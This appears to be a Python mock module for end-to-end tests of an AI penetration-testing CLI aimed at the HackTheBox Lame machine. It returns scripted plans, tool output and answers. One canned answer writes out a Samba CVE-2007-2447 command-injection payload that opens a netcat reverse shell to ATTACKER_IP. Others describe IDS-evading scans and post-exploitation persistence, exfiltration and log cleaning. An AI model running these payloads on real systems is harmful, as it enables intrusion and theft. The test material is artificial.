"""Mock implementations for E2E testing."""

import asyncio
import re
import time
from collections.abc import Awaitable, Callable
from typing import Any

from wish_ai.planning.models import Plan, PlanStep
from wish_cli.headless import HeadlessWish


def get_plan_from_event(event):
    """Extract Plan object from event data."""
    plan_data = event.data["plan"]

    # Plan is already a Plan object from HeadlessWish
    if hasattr(plan_data, 'steps'):
        return plan_data
    else:
        return Plan.from_dict(plan_data)


class MockLLMService:
    """Simple LLM mock for deterministic testing."""

    def __init__(self):
        self.plan_patterns = {
            "scan": self._generate_scan_plan,
            "enumerate": self._generate_enum_plan,
            "exploit": self._generate_exploit_plan,
            "check": self._generate_check_plan,
        }
        # Track conversation history
        self.conversation_history = []
        # Track knowledge queries
        self.knowledge_queries = []
        # Track discovered vulnerabilities
        self.discovered_vulnerabilities = []

    async def generate_plan(self, prompt: str, context: dict) -> Plan:
        """Generate deterministic plans based on prompt content."""
        prompt_lower = prompt.lower()

        # Track conversation
        self.conversation_history.append({"role": "user", "content": prompt})

        # Check for knowledge queries
        if "knowledge" in prompt_lower or "what is" in prompt_lower or "tell me about" in prompt_lower:
            self.knowledge_queries.append(prompt)

        # Check for sequential operations (first...then...)
        if ("first" in prompt_lower and "then" in prompt_lower) or ("after" in prompt_lower and "scan" in prompt_lower):
            # Generate multi-step dependent plan
            steps = []

            # Extract IP
            ip_matches = re.findall(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', prompt)
            target_ip = ip_matches[0] if ip_matches else "10.10.10.3"

            # Add scan step first
            steps.append(PlanStep(
                tool_name="nmap",
                command=f"nmap -sV -sC {target_ip}",
                purpose=f"Initial scan of {target_ip}",
                expected_result="List of open ports and service versions"
            ))

            # Add enumeration step
            if "enumerate" in prompt_lower:
                steps.append(PlanStep(
                    tool_name="enum4linux",
                    command=f"enum4linux -a {target_ip}",
                    purpose="Enumerate discovered services",
                    expected_result="Detailed service enumeration"
                ))

            return Plan(
                description=f"Sequential workflow for {target_ip}",
                steps=steps,
                rationale="Execute operations in sequence as requested"
            )

        # Check for specific patterns first
        if "thorough" in prompt_lower and "enumeration" in prompt_lower:
            return self._generate_enum_plan(prompt, context)
        elif "exhaustive" in prompt_lower and "scan" in prompt_lower:
            return self._generate_scan_plan(prompt, context)
        elif "comprehensive" in prompt_lower and ("scan" in prompt_lower or "enumeration" in prompt_lower):
            # Generate multi-step plan for comprehensive operations
            steps = []

            # Extract IP
            ip_matches = re.findall(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', prompt)
            target_ip = ip_matches[0] if ip_matches else "10.10.10.3"

            # Add scan step
            steps.append(PlanStep(
                tool_name="nmap",
                command=f"nmap -sV -sC {target_ip}",
                purpose=f"Comprehensive port scan of {target_ip}",
                expected_result="List of open ports and service versions"
            ))

            # Add enumeration steps
            steps.append(PlanStep(
                tool_name="enum4linux",
                command=f"enum4linux -a {target_ip}",
                purpose="Enumerate SMB shares and users",
                expected_result="SMB share listings and user information"
            ))

            steps.append(PlanStep(
                tool_name="nikto",
                command=f"nikto -h {target_ip}",
                purpose="Web vulnerability scanning",
                expected_result="Web vulnerabilities and misconfigurations"
            ))

            return Plan(
                description=f"Comprehensive scan and enumeration plan for {target_ip}",
                steps=steps,
                rationale="Multi-tool approach for complete reconnaissance"
            )

        # Check for specific tool mentions
        if "nmap" in prompt_lower and ("scan" in prompt_lower or "run" in prompt_lower):
            return self._generate_scan_plan(prompt, context)

        # Match prompt to plan type
        for keyword, generator in self.plan_patterns.items():
            if keyword in prompt_lower:
                return generator(prompt, context)

        # Default plan - always include at least one step
        return Plan(
            description="Default plan for: " + prompt[:50],
            steps=[
                PlanStep(
                    tool_name="echo",
                    command=f"echo 'Processing: {prompt[:50]}'",
                    purpose="Process the request",
                    expected_result="Request processed"
                )
            ],
            rationale="No specific action pattern matched"
        )

    def _generate_scan_plan(self, prompt: str, context: dict) -> Plan:
        """Generate scan plan."""
        # Extract IPs from prompt
        ip_matches = re.findall(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', prompt)

        # Check for IP range pattern (e.g., 10.10.10.1-5)
        range_match = re.search(r'(\d{1,3}\.\d{1,3}\.\d{1,3})\.(\d{1,3})-(\d{1,3})', prompt)
        if range_match:
            base_ip = range_match.group(1)
            start = int(range_match.group(2))
            end = int(range_match.group(3))
            # Generate IPs from range
            targets = [f"{base_ip}.{i}" for i in range(start, end + 1)]
        else:
            targets = ip_matches if ip_matches else []

        # Check for multiple targets or parallel keywords
        if ("parallel" in prompt.lower() or "simultaneous" in prompt.lower() or
            len(targets) > 1 or "," in prompt or range_match):

            # Generate multiple scan steps
            steps = []
            if not targets:
                targets = ["10.10.10.1", "10.10.10.2", "10.10.10.3"]

            for target in targets[:5]:  # Limit to 5 for testing
                steps.append(PlanStep(
                    tool_name="nmap",
                    command=f"nmap -sV -sC {target}",
                    purpose=f"Scan target {target} for open ports and services",
                    expected_result=f"List of open ports and service versions for {target}"
                ))

            return Plan(
                description=f"Parallel network scanning plan for {len(steps)} targets",
                steps=steps,
                rationale="Parallel scanning to quickly identify attack surface across multiple targets"
            )
        else:
            # Single target scan
            target_ip = targets[0] if targets else "10.10.10.10"

            return Plan(
                description=f"Network scanning plan for {target_ip}",
                steps=[
                    PlanStep(
                        tool_name="nmap",
                        command=f"nmap -sV -sC {target_ip}",
                        purpose="Scan target for open ports and services",
                        expected_result="List of open ports and service versions"
                    )
                ],
                rationale="Initial reconnaissance to identify attack surface"
            )

    def _generate_enum_plan(self, prompt: str, context: dict) -> Plan:
        """Generate enumeration plan."""
        steps = []

        if "smb" in prompt.lower():
            steps.append(PlanStep(
                tool_name="enum4linux",
                command="enum4linux -a 10.10.10.10",
                purpose="Enumerate SMB shares and users",
                expected_result="SMB share listings and user information"
            ))

        if "web" in prompt.lower() or "http" in prompt.lower():
            steps.append(PlanStep(
                tool_name="gobuster",
                command="gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirb/common.txt",
                purpose="Directory enumeration",
                expected_result="Hidden directories and files"
            ))

        return Plan(
            description="Service enumeration plan",
            steps=steps or [PlanStep(
                tool_name="nikto",
                command="nikto -h 10.10.10.10",
                purpose="Web vulnerability scanning",
                expected_result="Web vulnerabilities and misconfigurations"
            )],
            rationale="Detailed enumeration to find attack vectors"
        )

    def _generate_exploit_plan(self, prompt: str, context: dict) -> Plan:
        """Generate exploitation plan."""
        if "cve-2007-2447" in prompt.lower() or "samba" in prompt.lower():
            return Plan(
                description="Samba username map script exploitation",
                steps=[
                    PlanStep(
                        tool_name="exploit",
                        command="python3 /opt/exploits/usermap_script.py 10.10.10.10 445",
                        purpose="Exploit Samba username map script vulnerability",
                        expected_result="Remote shell access"
                    )
                ],
                rationale="Exploiting known vulnerability CVE-2007-2447"
            )

        return Plan(
            description="Generic exploitation attempt",
            steps=[
                PlanStep(
                    tool_name="echo",
                    command="echo 'No specific exploit identified, manual investigation required'",
                    purpose="Placeholder for manual exploitation",
                    expected_result="Manual exploitation guidance"
                )
            ],
            rationale="No specific exploit identified"
        )

    def _generate_check_plan(self, prompt: str, context: dict) -> Plan:
        """Generate vulnerability check plan."""
        return Plan(
            description="Vulnerability assessment plan",
            steps=[
                PlanStep(
                    tool_name="nmap",
                    command="nmap --script vuln 10.10.10.10",
                    purpose="Check for common vulnerabilities",
                    expected_result="List of potential vulnerabilities"
                )
            ],
            rationale="Automated vulnerability detection"
        )

    async def generate_response(self, prompt: str, context: dict) -> str:
        """Generate AI response for conversational queries."""
        # Track conversation
        self.conversation_history.append({"role": "user", "content": prompt})

        # Check for knowledge queries
        if "knowledge" in prompt.lower() or "what is" in prompt.lower() or "tell me about" in prompt.lower():
            self.knowledge_queries.append(prompt)

        # Check for vulnerability mentions
        if "vulnerability" in prompt.lower() or "cve" in prompt.lower() or "exploit" in prompt.lower():
            # Track as vulnerability discovery
            if "cve-2007-2447" in prompt.lower() or "samba" in prompt.lower():
                self.discovered_vulnerabilities.append("CVE-2007-2447")

        if "next" in prompt.lower() or "what should" in prompt.lower():
            # Analyze context
            state = context.get("state", {})
            hosts = state.get("hosts", [])

            if not hosts:
                return "I recommend starting with a network scan to identify live hosts and services."
            elif any(h.services for h in hosts):
                return (
                    "Now that we've identified services, I suggest enumerating them for "
                    "vulnerabilities. Focus on any web services or SMB shares."
                )
            else:
                return "The scan is complete. Let's analyze the results and plan our next move."

        response = "I'll help you with that penetration testing task."
        self.conversation_history.append({"role": "assistant", "content": response})
        return response


class MockToolExecutor:
    """Tool execution mock for testing."""

    def __init__(self):
        self.outputs = {
            "nmap": self._nmap_output,
            "nikto": self._nikto_output,
            "gobuster": self._gobuster_output,
            "enum4linux": self._enum4linux_output,
            "exploit": self._exploit_output,
        }
        self.execution_count = {}

    async def execute(self, command: str) -> dict:
        """Mock tool execution."""
        tool = command.split()[0].split("/")[-1]  # Handle paths

        # Track execution count
        self.execution_count[tool] = self.execution_count.get(tool, 0) + 1

        # Add small delay to simulate actual tool execution
        await asyncio.sleep(0.1)

        # Get output generator
        output_gen = self.outputs.get(tool, self._default_output)
        output = output_gen(command)

        return {
            "output": output,
            "exit_code": 0,
            "execution_time": 1.5,
            "tool": tool
        }

    def _nmap_output(self, command: str) -> str:
        """Generate nmap output."""
        # Extract target IP from command
        import re
        ip_match = re.search(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', command)
        target_ip = ip_match.group(0) if ip_match else "10.10.10.3"

        return f"""Starting Nmap 7.80 ( https://nmap.org ) at 2024-01-01 12:00:00 UTC
Nmap scan report for lame.htb ({target_ip})
Host is up (0.031s latency).
Not shown: 995 closed ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.34 seconds"""

    def _nikto_output(self, command: str) -> str:
        """Generate nikto output."""
        return """- Nikto v2.1.6
+ Target IP:          10.10.10.3
+ Target Hostname:    lame.htb
+ Target Port:        80
+ Start Time:         2024-01-01 12:00:00
+ Server: Apache/2.2.3 (Ubuntu) DAV/2
+ Retrieved x-powered-by header: PHP/5.2.4-2ubuntu5.10
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined.
+ The X-Content-Type-Options header is not set.
+ Apache/2.2.3 appears to be outdated (current is at least Apache/2.4.37).
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable
+ OSVDB-3268: /css/: Directory indexing found.
+ OSVDB-3092: /LICENSE.txt: License file found may identify site software."""

    def _gobuster_output(self, command: str) -> str:
        """Generate gobuster output."""
        return """/index.html           (Status: 200) [Size: 891]
/images               (Status: 301) [Size: 314]
/css                  (Status: 301) [Size: 311]
/js                   (Status: 301) [Size: 310]
/admin                (Status: 401) [Size: 461]
/backup               (Status: 301) [Size: 314]
/.htaccess            (Status: 403) [Size: 289]
/.htpasswd            (Status: 403) [Size: 289]"""

    def _enum4linux_output(self, command: str) -> str:
        """Generate enum4linux output."""
        return """Starting enum4linux v0.8.9
Target Information
    Target ........... 10.10.10.3
    RID Range ........ 500-550,1000-1050
    Username ......... ''
    Password ......... ''

Share Enumeration on 10.10.10.3
    tmp             Disk      oh noes!
    opt             Disk
    IPC$            IPC       IPC Service (lame server)
    ADMIN$          IPC       IPC Service (lame server)

Password Policy Information for 10.10.10.3
    [+] Password Info for Domain: LAME
    [+] Minimum password length: 5
    [+] Password history length: None

Groups on 10.10.10.3
    group:[root] rid:[0x0]
    group:[daemon] rid:[0x1]
    group:[bin] rid:[0x2]"""

    def _exploit_output(self, command: str) -> str:
        """Generate exploit output."""
        if "usermap_script" in command:
            return """[*] Attempting to exploit Samba username map script...
[+] Connecting to target on port 445
[+] Sending malicious username
[+] Command injection successful!
[+] Shell obtained!

# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)"""

        return "[!] Exploit failed: No vulnerable service found"

    def _default_output(self, command: str) -> str:
        """Default output for unknown tools."""
        return f"Mock output for command: {command}"


def setup_mocks(wish: HeadlessWish) -> HeadlessWish:
    """Apply mocks to HeadlessWish instance."""
    # Import the proper MockCommandDispatcher from headless_mocks
    from mocks.headless_mocks import MockCommandDispatcher as HeadlessMockCommandDispatcher

    # Replace core components with mocks
    wish.config_manager = MockConfigManager()
    wish.session_manager = MockSessionManager()
    wish.state_manager = MockStateManager()

    # Create integrated mocks - use the HeadlessMockCommandDispatcher which has slash command support
    wish.command_dispatcher = HeadlessMockCommandDispatcher(wish.auto_approve)
    wish.tool_executor = MockToolExecutor()
    wish.job_manager = MockJobManager()

    # Wire them together
    wish.command_dispatcher.job_manager = wish.job_manager
    wish.command_dispatcher.tool_executor = wish.tool_executor
    wish.command_dispatcher.wish_instance = wish  # This gives access to state_manager
    wish.command_dispatcher.ui_manager = wish.ui_manager

    # Replace AI gateway with mock
    wish.ai_gateway = type('MockAIGateway', (), {})()
    wish.ai_gateway.generate_plan = MockLLMService().generate_plan
    wish.ai_gateway.generate_response = MockLLMService().generate_response

    # Hook up event callback for job events
    async def fire_event(event_type: str, data: dict):
        # Convert to HeadlessWish event format
        if event_type == "job_started":
            event_key = "job_started"
        elif event_type == "job_completed":
            event_key = "job_completed"
        elif event_type == "job_failed":
            event_key = "error_occurred"  # Map job_failed to error_occurred
            data = {"error": data.get("error", "Job failed"), "job_id": data.get("job_id")}
        else:
            event_key = event_type

        # Fire events through wish event handlers
        if event_key in wish._event_handlers:
            for handler in wish._event_handlers[event_key]:
                class MockEvent:
                    def __init__(self, event_type, data):
                        self.event_type = event_type
                        self.data = data
                        self.timestamp = time.time()

                await handler(MockEvent(event_key, data))

    wish.job_manager.event_callback = fire_event

    # Mock other components
    wish.event_collector = type('MockEventCollector', (), {})()
    wish.conversation_manager = type('MockConversationManager', (), {})()
    wish.plan_generator = type('MockPlanGenerator', (), {})()

    return wish


class MockCommandDispatcher:
    """Mock command dispatcher with job manager integration."""

    def __init__(self, auto_approve: bool = False):
        self.auto_approve = auto_approve
        self.command_history: list[str] = []
        self.job_manager: MockJobManager | None = None
        self.tool_executor: MockToolExecutor | None = None
        self.wish_instance = None

    async def initialize(self, session_metadata):
        """Initialize the command dispatcher with session metadata."""
        self.session_metadata = session_metadata

    async def _execute_tool_coroutine(self, step_command: str, step_tool_name: str):
        """Execute a tool for a specific step."""
        try:
            # Use MockToolExecutor's execute method
            result = await self.tool_executor.execute(step_command)
            # Convert result to expected format
            return type('Result', (), {
                'stdout': result['output'],
                'stderr': '',
                'exit_code': result['exit_code'],
                'success': result['exit_code'] == 0
            })()
        except Exception:
            # Log error but return a result
            # Return a proper mock result with nmap-like output
            return type('Result', (), {
                'stdout': (
                    self.tool_executor._nmap_output(step_command)
                    if 'nmap' in step_tool_name
                    else f'Mock output for {step_command}'
                ),
                'stderr': '',
                'exit_code': 0,
                'success': True
            })()

    async def process_command(self, command: str) -> str:
        """Process command with job management."""
        self.command_history.append(command)

        # Check for special commands that need custom responses
        command_lower = command.lower()

        # Handle simple direct questions first
        if "how do i enumerate smb shares" in command_lower:
            return (
                "To enumerate SMB shares, use these tools: 1) **smbclient -L //target -N** to list shares, "
                "2) **enum4linux -a target** for comprehensive enumeration including users and shares, "
                "3) **smbmap -H target** to check share permissions, 4) **rpcclient -U '' target** for "
                "RPC-based enumeration. Start with smbclient for quick results, then use enum4linux for "
                "detailed information."
            )

        elif "what port does ssh typically run on" in command_lower:
            return (
                "SSH typically runs on port 22 (TCP). This is the standard port defined in the SSH "
                "protocol specification. While SSH can be configured to run on any port, port 22 is "
                "the default and most common configuration."
            )

        elif "what is the cve for samba username map script" in command_lower:
            return (
                "The CVE for the Samba username map script vulnerability is CVE-2007-2447. This "
                "vulnerability affects Samba versions 3.0.0 through 3.0.25rc3 and allows remote "
                "command execution through metacharacter injection in the username field."
            )

        elif "what are common smb ports" in command_lower:
            return (
                "Common SMB ports are: port 139 (NetBIOS Session Service) and port 445 "
                "(Microsoft-DS/SMB over TCP). Port 445 is the modern SMB port used in Windows 2000 "
                "and later, while port 139 is the legacy NetBIOS port. Both TCP ports are used for "
                "SMB/CIFS file sharing and related services."
            )

        elif "what does this error mean and how do i fix it" in command_lower:
            # Check if we have nmap error context
            if self.command_history and any(
                "nmap returned error" in cmd or "scan completed but" in cmd
                for cmd in self.command_history
            ):
                return (
                    "The nmap error code 1 indicates a permission issue. You need to run nmap with "
                    "elevated privileges using sudo. Try: sudo nmap [options] [target]. Also check if "
                    "the target is reachable and make sure firewall rules allow the scan. Common fixes: "
                    "1) Use sudo for root privileges, 2) Check network connectivity, 3) Verify target IP "
                    "is correct, 4) Ensure no firewall blocking."
                )

        # Handle interpretation/analysis/summary commands - these should return text, not execute plans
        if (("analyze" in command_lower or "interpret" in command_lower or
            "identify" in command_lower or "assess" in command_lower or "summarize" in command_lower)
            and ("result" in command_lower or "found" in command_lower or "what was" in command_lower)):
            # Get current state for context
            if self.wish_instance:
                state = await self.wish_instance.state_manager.get_current_state()
                if state.hosts:
                    # Analyze discovered services
                    services_found = []
                    for host in state.hosts.values():
                        for service in host.services:
                            services_found.append(f"{service.service_name} ({service.product} {service.version})")

                    # Build comprehensive summary
                    num_hosts = len(state.hosts)
                    total_services = len(services_found)
                    unique_services = len({s.split()[0] for s in services_found})

                    response = (
                        f"Summary: Found {num_hosts} hosts with {total_services} services across "
                        f"{unique_services} different service types. "
                    )

                    if services_found:
                        response += f"Services discovered: {', '.join(services_found[:5])}"
                        if len(services_found) > 5:
                            response += f" and {len(services_found) - 5} more. "
                        else:
                            response += ". "

                    # Check for specific vulnerabilities
                    if any("samba" in s.lower() or "smb" in s.lower() for s in services_found):
                        response += (
                            "Vulnerable SMB service detected. Recommend immediate enumeration "
                            "of shares and version checking. "
                        )
                    if any("ssh" in s.lower() for s in services_found):
                        response += "SSH service may allow brute force attacks. "
                    if any("http" in s.lower() or "web" in s.lower() for s in services_found):
                        response += "HTTP service should be tested for web vulnerabilities."

                    # Add port information
                    all_ports = []
                    for host in state.hosts.values():
                        for service in host.services:
                            all_ports.append(service.port)
                    if all_ports:
                        response += f" Open ports found: {', '.join(map(str, sorted(set(all_ports[:10]))))}."

                    return response

            return (
                "Scan results show vulnerable SMB service. Recommend immediate enumeration of shares "
                "and version checking. SSH service may allow brute force attacks. HTTP service should "
                "be tested for web vulnerabilities."
            )

        # Handle manual exploitation BEFORE general exploit commands
        elif "manual" in command_lower and "exploit" in command_lower and "samba" in command_lower:
            return """To exploit Samba manually without Metasploit:

1. **Using Python**:
```python
from smb.SMBConnection import SMBConnection
# Create connection with malicious username
username = "/=`nohup nc -e /bin/sh ATTACKER_IP 4444`"
conn = SMBConnection(username, "", "WORKGROUP", "ATTACKER", use_ntlm_v2=False)
conn.connect("10.10.10.3", 445)
```

2. **Using smbclient**:
```bash
smbclient //10.10.10.3/tmp -U "./=`nohup nc -e /bin/sh ATTACKER_IP 4444`"
```

3. **Custom exploit script**: Create a script that sends SMB packets with command injection in the username field

4. **Using netcat and telnet**: Craft raw SMB packets with injected commands

The key is to inject shell metacharacters in the username field during SMB authentication."""

        # Handle exploit commands - these should return success messages, not execute plans
        elif "exploit" in command_lower and (
            "samba" in command_lower or "username map" in command_lower
            or "vulnerability" in command_lower
        ):
            # Return exploitation success message
            return (
                "Exploitation successful! Shell obtained with root privileges. The Samba username map "
                "script vulnerability (CVE-2007-2447) was successfully exploited."
            )

        # Handle privilege check commands
        elif "check" in command_lower and ("privilege" in command_lower or "privs" in command_lower):
            return "Current privileges: root (uid=0, gid=0). Full administrative access achieved."

        # Handle "how can I exploit" questions - these should return advice, not execute
        elif "how can i exploit" in command_lower or "how do i exploit" in command_lower:
            # Check for specific context
            if self.wish_instance:
                state = await self.wish_instance.state_manager.get_current_state()
                if state.findings:
                    # Look for Samba vulnerabilities
                    for finding in state.findings.values():
                        if "samba" in finding.title.lower() or "CVE-2007-2447" in str(finding.cve_ids):
                            return (
                                "Exploitation guidance for CVE-2007-2447: The Samba 3.0.20 service is "
                                "vulnerable to username map script command injection. You can exploit this "
                                "using metasploit module exploit/multi/samba/usermap_script or manual "
                                "smbclient connection with malicious username payload."
                            )

            return (
                "Exploitation guidance for CVE-2007-2447: The Samba 3.0.20 service is vulnerable to "
                "username map script command injection. You can exploit this using metasploit module "
                "exploit/multi/samba/usermap_script or manual smbclient connection with malicious username payload."
            )

        elif "scan failed" in command_lower and "what should" in command_lower:
            return (
                "Try alternative approach: verify target connectivity, check firewall rules, use "
                "different scan techniques, or try scanning a different target instead."
            )
        elif "how to" in command_lower or "what is" in command_lower or "tell me about" in command_lower:
            # This is a knowledge query - use LLM to generate response
            llm = MockLLMService()
            response = await llm.generate_response(command, {})

            # For SMB enumeration specifically
            if "smb" in command_lower and ("enumerate" in command_lower or "enumeration" in command_lower):
                return (
                    "To enumerate SMB shares on Linux, you can use several tools:\n\n"
                    "1. **enum4linux** - Comprehensive SMB enumeration\n"
                    "   `enum4linux -a <target>`\n\n"
                    "2. **smbclient** - List and access shares\n"
                    "   `smbclient -L //<target> -N`\n\n"
                    "3. **rpcclient** - RPC enumeration\n"
                    "   `rpcclient -U '' -N <target>`\n\n"
                    "4. **smbmap** - SMB share mapping\n"
                    "   `smbmap -H <target>`\n\n"
                    "These tools help identify shares, users, and potential vulnerabilities."
                )

            # Also handle generic "how do I enumerate SMB shares" question
            if (("how" in command_lower or "enumerate" in command_lower)
                and "smb" in command_lower and "shares" in command_lower):
                return (
                "To enumerate SMB shares, use these tools: 1) **smbclient -L //target -N** to list shares, "
                "2) **enum4linux -a target** for comprehensive enumeration including users and shares, "
                "3) **smbmap -H target** to check share permissions, 4) **rpcclient -U '' target** for "
                "RPC-based enumeration. Start with smbclient for quick results, then use enum4linux for "
                "detailed information."
            )

            return response
        # Handle defensive recommendations
        elif "defensive" in command_lower and ("measure" in command_lower or "prevent" in command_lower):
            return (
                "Defensive measures to prevent this attack: 1) Patch and update Samba to the latest version, "
                "2) Disable unnecessary services (distcc, unused SMB shares), 3) Implement proper firewall rules "
                "to restrict access, 4) Harden system configurations and remove default credentials, "
                "5) Monitor logs for suspicious activities, 6) Segment network to limit lateral movement, "
                "7) Regular security audits and vulnerability scanning."
            )

        # Handle specific Samba hardening
        elif "harden" in command_lower and "samba" in command_lower:
            return (
                "To harden Samba against this specific attack: 1) Disable the 'username map script' parameter "
                "in smb.conf, 2) Remove any username map configurations that execute external commands, "
                "3) Use strong authentication and disable guest access, 4) Restrict SMB access to specific IP ranges, "
                "5) Enable SMB signing, 6) Regularly update to the latest Samba version, "
                "7) Monitor Samba logs for suspicious activity. The vulnerability exists because the username map "
                "script allows command injection through metacharacters."
            )

        # Handle learning mode - explain HTB Lame
        elif "explain" in command_lower and ("lame" in command_lower or "called" in command_lower):
            return (
                "HTB Lame is called 'Lame' because it's one of the easiest boxes on HackTheBox, "
                "designed for beginners. "
                "The name reflects how straightforward the exploitation is - the box runs an old, unpatched version "
                "of Samba with a well-known vulnerability (CVE-2007-2447) that allows easy remote code execution. "
                "It's a 'lame' (simple) target that teaches fundamental penetration testing concepts like service "
                "enumeration, vulnerability identification, and basic exploitation."
            )

        # Handle vulnerability explanation
        elif ("explain" in command_lower and
              ("CVE-2007-2447" in command or "vulnerability" in command_lower) and
              "works" in command_lower):
            return (
                "CVE-2007-2447 is a command injection vulnerability in Samba versions 3.0.0 through 3.0.25rc3. "
                "The vulnerability exists in the 'username map script' functionality, "
                "which allows mapping of usernames. "
                "When processing username map script entries, Samba doesn't properly sanitize user input, allowing "
                "metacharacters like backticks (`) to be interpreted as shell commands. "
                "An attacker can inject commands "
                "by including shell metacharacters in the username during authentication. "
                "For example, sending a username "
                "like 'user`id`' would execute the 'id' command on the server. This gives attackers remote command "
                "execution with the privileges of the Samba service."
            )

        # Handle similar vulnerabilities question
        elif "similar" in command_lower and "vulnerabilities" in command_lower:
            return (
                "Similar vulnerabilities to CVE-2007-2447 include: 1) Command Injection vulnerabilities - "
                "where user input is passed to system commands without proper sanitization (e.g., Shellshock, "
                "ImageTragick), 2) Remote Code Execution (RCE) vulnerabilities in network services "
                "(e.g., MS08-067, EternalBlue), 3) Authentication bypass vulnerabilities that lead to "
                "command execution, 4) Other Samba vulnerabilities like SambaCry (CVE-2017-7494), "
                "5) Username/password field injections in various services, 6) LDAP injection, SQL injection "
                "that can lead to command execution. These all share the common pattern of improper input "
                "validation leading to unintended code execution."
            )

        # Handle report generation
        elif "report" in command_lower and ("generate" in command_lower or "penetration test" in command_lower):
            return """## Executive Summary

A penetration test was conducted on target 10.10.10.3 (HTB Lame). Critical vulnerabilities were identified
that allow complete system compromise.

## Key Findings

### Finding 1: Outdated Samba Service with Remote Code Execution Vulnerability
- **Severity**: Critical
- **Service**: Samba 3.0.20 on port 445
- **Vulnerability**: CVE-2007-2447 - Username map script command execution
- **Impact**: Complete system compromise with root privileges

## Evidence

The following services were identified:
- Port 21: vsftpd 2.3.4 (vulnerable but backdoor not present)
- Port 22: OpenSSH 4.7p1
- Port 139/445: Samba 3.0.20 (vulnerable)
- Port 3632: distccd v1

Successful exploitation was achieved using the Samba vulnerability, granting root shell access.

## Impact Assessment

The identified vulnerability allows:
- Complete system compromise
- Unauthorized access to all data
- Ability to pivot to internal network
- Installation of persistence mechanisms
- Data exfiltration capabilities

## Recommendations

1. **Immediate Actions**:
   - Update Samba to the latest version
   - Disable username map script functionality
   - Implement network segmentation

2. **Short-term**:
   - Deploy IDS/IPS solutions
   - Enable comprehensive logging
   - Regular vulnerability scanning

3. **Long-term**:
   - Establish patch management process
   - Implement security awareness training
   - Regular penetration testing"""

        # Handle stealth scan
        elif "stealth" in command_lower and "scan" in command_lower:
            return (
                "Executing stealthy scan with: 1) SYN stealth scan (-sS flag) to avoid completing TCP handshakes, "
                "2) Slow timing template (-T2) to evade IDS detection, 3) Fragmented packets (-f) to bypass "
                "packet filters, 4) Decoy scanning (-D) to obscure source, 5) Randomized host order, "
                "6) Limited port range to reduce noise. Command: nmap -sS -T2 -f -D RND:10 --randomize-hosts "
                "-p21,22,139,445 10.10.10.3. This approach minimizes detection while still identifying key services."
            )

        # Handle post-exploitation questions
        elif ("post-exploitation" in command_lower or
              ("what" in command_lower and "should" in command_lower and "take" in command_lower)):
            return (
                "Recommended post-exploitation steps: 1) Establish persistence through cron jobs or SSH keys, "
                "2) Escalate privileges if needed (already root), 3) Perform lateral movement to other systems, "
                "4) Collect and exfiltrate sensitive data, 5) Clean logs to maintain stealth."
            )

        elif "what should" in command_lower and "next" in command_lower:
            # Check conversation history for context
            if self.command_history and len(self.command_history) > 1:
                prev_command = self.command_history[-2].lower()
                if "samba" in prev_command or "smb" in prev_command or "445" in prev_command:
                    return "Now that you've identified a Samba service, I recommend enumerating the SMB shares and checking the version for known vulnerabilities. Use tools like enum4linux or smbclient to enumerate shares and users."

            # Default response
            return "I recommend starting with network scanning to identify services and potential vulnerabilities."
        # Handle specific service vulnerability checks
        elif "check" in command_lower and "distcc" in command_lower and ("exploitable" in command_lower or "vulnerable" in command_lower):
            return "The distcc service on port 3632 is vulnerable to CVE-2004-2687, which allows remote command execution. This service can be exploited to gain initial access to the system."

        # Handle FTP vulnerability check
        elif "check" in command_lower and "ftp" in command_lower and ("vulnerabilities" in command_lower or "vulnerable" in command_lower):
            return "The FTP service is running vsftpd 2.3.4, which has a known backdoor vulnerability (CVE-2011-2523). However, testing reveals the backdoor is not present in this instance. The FTP service allows anonymous login but doesn't provide useful access. While the version is vulnerable in theory, this particular installation doesn't have the backdoor trigger active."

        elif "vulnerabilities" in command_lower and ("check" in command_lower or "should" in command_lower):
            # Check conversation history for context
            if self.command_history and len(self.command_history) > 1:
                # Look for Samba version in history
                for cmd in self.command_history[-3:]:  # Check last 3 commands
                    if "samba 3.0.20" in cmd.lower():
                        return "For Samba 3.0.20, you should check for CVE-2007-2447, the username map script command injection vulnerability. This is a critical remote code execution vulnerability that allows unauthenticated attackers to execute arbitrary commands. You can verify this with Metasploit's exploit/multi/samba/usermap_script module."

            # Default vulnerability check response
            return "Check for common vulnerabilities based on the service versions identified. Use vulnerability scanners and check CVE databases for known issues."

        # Handle error explanations
        elif "error" in command_lower and ("mean" in command_lower or "fix" in command_lower):
            if "error code 1" in command_lower or "nmap" in command_lower:
                return "Error code 1 from nmap typically indicates insufficient permissions. Try running with sudo or as root user. Also check if the target is reachable and firewall rules allow the scan. Make sure you have the necessary privileges to perform network scans."
            return "Please provide more details about the specific error you encountered so I can help troubleshoot it."

        # Handle zero-day vulnerability guidance
        elif "zero-day" in command_lower and ("found" in command_lower or "what should" in command_lower):
            return "If you've discovered a zero-day vulnerability, follow responsible disclosure practices: 1) Document the vulnerability thoroughly, 2) Contact the vendor directly through their security contact, 3) Allow reasonable time for patch development (typically 90 days), 4) Consider coordinating with CVE/MITRE for assignment, 5) Avoid public disclosure until patch is available, 6) Work with the vendor on coordinated disclosure timeline."

        # Handle technical accuracy questions
        elif "port" in command_lower and "ssh" in command_lower:
            return (
                "SSH typically runs on port 22 (TCP). This is the standard port defined in the SSH "
                "protocol specification. While SSH can be configured to run on any port, port 22 is "
                "the default and most common configuration."
            )

        elif "cve" in command_lower and "samba" in command_lower and ("username map" in command_lower or "usermap" in command_lower):
            return (
